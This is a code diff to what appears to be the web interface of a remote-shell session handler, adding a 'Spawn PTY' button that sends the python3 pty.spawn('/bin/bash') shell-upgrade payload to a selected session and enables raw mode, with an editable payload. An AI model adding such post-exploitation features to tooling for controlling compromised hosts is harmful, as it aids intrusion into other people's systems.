@@ -77,6 +77,7 @@ header span { color: #8b949e; font-size: 13px; }
         <span><strong>Session:</strong> <span id="current-session-label">-</span></span>
         <span><strong>Addr:</strong> <span id="current-addr-label">-</span></span>
         <span style="margin-left:auto;display:flex;align-items:center;gap:6px;">
+          <button id="pty-btn" style="background:#21262d;border:1px solid #30363d;color:#58a6ff;padding:2px 10px;border-radius:4px;font-size:11px;">Spawn PTY</button>
           <button id="raw-toggle" style="background:#21262d;border:1px solid #30363d;color:#8b949e;padding:2px 10px;border-radius:4px;font-size:11px;">Raw Mode OFF</button>
         </span>
       </div>
@@ -315,6 +316,28 @@ function escHtml(s) {
   d.textContent = s;
   return d.innerHTML;
 }
+
+const ptyBtn = document.getElementById('pty-btn');
+ptyBtn.addEventListener('click', () => {
+  if (!currentSession || !ws || ws.readyState !== WebSocket.OPEN) return;
+  const payload = localStorage.getItem('pty_payload') || "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'";
+  ws.send(JSON.stringify({type: 'pty_spawn', session_id: currentSession, payload}));
+  setTimeout(() => {
+    rawMode = true;
+    rawToggle.textContent = 'Raw Mode ON';
+    rawToggle.style.color = '#00ff00';
+    rawToggle.style.borderColor = '#00ff00';
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({type: 'raw_mode', session_id: currentSession, data: true}));
+    }
+  }, 500);
+});
+ptyBtn.addEventListener('contextmenu', (e) => {
+  e.preventDefault();
+  const current = localStorage.getItem('pty_payload') || "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'";
+  const val = prompt('PTY payload (right-click to change):', current);
+  if (val) localStorage.setItem('pty_payload', val);
+});
 
 const rawToggle = document.getElementById('raw-toggle');
 let rawMode = false;
